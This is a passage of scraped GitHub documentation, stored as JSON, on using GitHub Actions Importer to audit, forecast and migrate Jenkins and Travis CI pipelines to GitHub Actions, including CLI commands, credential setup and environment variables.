        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecast potential build runner usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Jenkins server."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites for running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "In order to run theforecastcommand against a Jenkins instance, you must install thepaginated-buildspluginon your Jenkins server. This plugin allows GitHub Actions Importer to efficiently retrieve historical build data for jobs that have a large number of builds. Because Jenkins does not provide a method to retrieve paginated build data, using this plugin prevents timeouts from the Jenkins server that can occur when fetching a large amount of historical data. Thepaginated-buildsplugin is open source, and exposes a REST API endpoint to fetch build data in pages, rather than all at once."
      },
      {
        "type": "paragraph",
        "text": "To install thepaginated-buildsplugin:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On your Jenkins instance, navigate tohttps://<your-jenkins-instance>/pluginManager/available.",
          "Search for thepaginated-buildsplugin.",
          "Check the box on the left and selectInstall without restart."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast jenkins --output-dir tmp/forecast"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Queue timemetrics describe the amount of time a job spent waiting for a runner to be available to execute it.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, these metrics are defined for each queue of runners in Jenkins. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a dry-run migration of a Jenkins pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a Jenkins pipeline to its equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the dry-run command"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a Jenkins pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your Jenkins pipelines to GitHub Actions, run the following command in your terminal, replacingmy-jenkins-projectwith the URL of your Jenkins job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run jenkins --source-url my-jenkins-project --output-dir tmp/dry-run"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the converted workflows"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a production migration of a Jenkins pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use themigratecommand to convert a Jenkins pipeline and open a pull request with the equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command"
      },
      {
        "type": "paragraph",
        "text": "To migrate a Jenkins pipeline to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, andmy-jenkins-projectwith the URL for your Jenkins job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate jenkins --target-url https://github.com/:owner/:repo --output-dir tmp/migrate --source-url my-jenkins-project"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate jenkins --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --source-url http://localhost:8080/job/monas_dev_work/job/monas_freestyle\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Jenkins."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your Jenkins instance:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requiresrepoandworkflowscopes).",
          "GITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example,https://github.com).",
          "JENKINS_ACCESS_TOKEN: The Jenkins API token used to view Jenkins resources.NoteThis token requires access to all jobs that you want to migrate or audit. In cases where a folder or job does not inherit access control lists from their parent, you must grant explicit permissions or full admin privileges.",
          "JENKINS_USERNAME: The username of the user account that created the Jenkins API token.",
          "JENKINS_INSTANCE_URL: The URL of the Jenkins instance.",
          "JENKINSFILE_ACCESS_TOKEN(Optional) The API token used to retrieve the contents of aJenkinsfilestored in the build repository. This requires thereposcope. If this is not provided, theGITHUB_ACCESS_TOKENwill be used instead."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that is loaded by GitHub Actions Importer when it is run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with theforecast,dry-run, ormigrationsubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead. You can use this option for Jenkinsfile and multibranch pipelines."
      },
      {
        "type": "paragraph",
        "text": "If you would like to supply multiple source files when running theforecastsubcommand, you can use pattern matching in the file path value. For example,gh forecast --source-file-path ./tmp/previous_forecast/jobs/*.jsonsupplies GitHub Actions Importer with any source files that match the./tmp/previous_forecast/jobs/*.jsonfile path."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Jenkinsfile pipeline example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified Jenkinsfile as the source file to perform a dry run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run jenkins --output-dir path/to/output/ --source-file-path path/to/Jenkinsfile --source-url :url_to_jenkins_job"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "paragraph",
        "text": "When you use the--config-file-pathoption with thedry-runormigratesubcommands, GitHub Actions Importer matches the repository slug to the job represented by the--source-urloption to select the pipeline. It uses theconfig-file-pathto pull the specified source file."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit jenkins --output-dir path/to/output/ --config-file-path path/to/jenkins/config.yml"
      },
      {
        "type": "paragraph",
        "text": "To audit a Jenkins instance using a config file, the config file must be in the following format, and eachrepository_slugvalue must be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: pipeline-name\n    path: path/to/Jenkinsfile\n  - repository_slug: multi-branch-pipeline-name\n    branches:\n      - branch: main\n        path: path/to/Jenkinsfile\n      - branch: node\n        path: path/to/Jenkinsfile"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported syntax for Jenkins pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following tables show the type of properties GitHub Actions Importer is currently able to convert. For more details about how Jenkins pipeline syntax aligns with GitHub Actions, seeMigrating from Jenkins to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For information about supported Jenkins plugins, see thegithub/gh-actions-importerrepository."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Supported syntax for Freestyle pipelines"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Supported syntax for Jenkinsfile pipelines"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variables syntax"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default Jenkins environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from Travis CI with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Travis CI pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A Travis CI account or organization with pipelines and jobs that you want to convert to GitHub Actions workflows.",
          "Access to create a Travis CI API access token for your account or organization.",
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations when migrating from Travis CI pipelines to GitHub Actions with GitHub Actions Importer."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "Certain Travis CI constructs must be migrated manually. These include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Secrets",
          "Unknown job properties"
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on manual migrations, seeMigrating from Travis CI to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Travis CI project languages"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer transforms Travis CI project languages by adding a set of preconfigured build tools and a default build script to the transformed workflow. If no language is explicitly declared, GitHub Actions Importer assumes a project language is Ruby."
      },
      {
        "type": "paragraph",
        "text": "For a list of the project languages supported by GitHub Actions Importer, seeSupported project languages."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with Travis CI and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create a Travis CI API access token. For more information, seeGet your Travis CI API tokenin the Travis CI documentation.After creating the token, copy it and save it in a safe location for later use.",
          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectTravis CI, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Personal access token for Travis CI\", enter the value for the Travis CI API access token that you created earlier, and pressEnter.For \"Base url of the Travis CI instance\", enter the URL of your Travis CI instance, and pressEnter.For \"Travis CI organization name\", enter the name of your Travis CI organization, and pressEnter.An example of the output of theconfigurecommand is shown below.$gh actions-importer configure✔ Which CI providers are you configuring?: Travis CI\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Personal access token for Travis CI: ***************\n✔ Base url of the Travis CI instance: https://travis-ci.com\n✔ Travis CI organization name: actions-importer-labs\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectTravis CI, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Personal access token for Travis CI\", enter the value for the Travis CI API access token that you created earlier, and pressEnter.",
          "For \"Base url of the Travis CI instance\", enter the URL of your Travis CI instance, and pressEnter.",
          "For \"Travis CI organization name\", enter the name of your Travis CI organization, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of Travis CI"
      },
      {
        "type": "paragraph",
        "text": "You can use theauditcommand to get a high-level view of all pipelines in a Travis CI server."
      },
      {
        "type": "paragraph",
        "text": "Theauditcommand performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the projects defined in a Travis CI server.",
          "Converts each pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit of a Travis CI server, run the following command in your terminal:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit travis-ci --output-dir tmp/audit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecast potential build runner usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Travis CI server."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions usage, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast travis-ci --output-dir tmp/forecast"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Queue timemetrics describe the amount of time a job spent waiting for a runner to be available to execute it.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, these metrics are defined for each queue of runners in Travis CI. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a dry-run migration of a Travis CI pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a Travis CI pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your Travis CI pipelines to GitHub Actions, run the following command in your terminal, replacingmy-travis-ci-repositorywith the name of your Travis CI repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run travis-ci --travis-ci-repository my-travis-ci-repository --output-dir tmp/dry-run"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a production migration of a Travis CI pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use themigratecommand to convert a Travis CI pipeline and open a pull request with the equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command"
      },
      {
        "type": "paragraph",
        "text": "To migrate a Travis CI pipeline to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, andmy-travis-ci-repositorywith the name of your Travis CI repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Travis CI."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your Travis CI instance:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requires theworkflowscope).",
          "GITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example,https://github.com).",
          "TRAVIS_CI_ACCESS_TOKEN: The Travis CI API access token used to view Travis CI resources.",
          "TRAVIS_CI_ORGANIZATION: The organization name of your Travis CI instance.",
          "TRAVIS_CI_INSTANCE_URL: The URL of the Travis CI instance.",
          "TRAVIS_CI_SOURCE_GITHUB_ACCESS_TOKEN: (Optional) The personal access token used to authenticate with your source GitHub instance. If not provided,GITHUB_ACCESS_TOKENwill be used instead.",
          "TRAVIS_CI_SOURCE_GITHUB_INSTANCE_URL: (Optional) The URL to the source GitHub instance, such ashttps://github.com. If not provided,GITHUB_INSTANCE_URLwill be used instead."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that is loaded by GitHub Actions Importer when it is run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with theforecast,dry-run, ormigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from source control. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
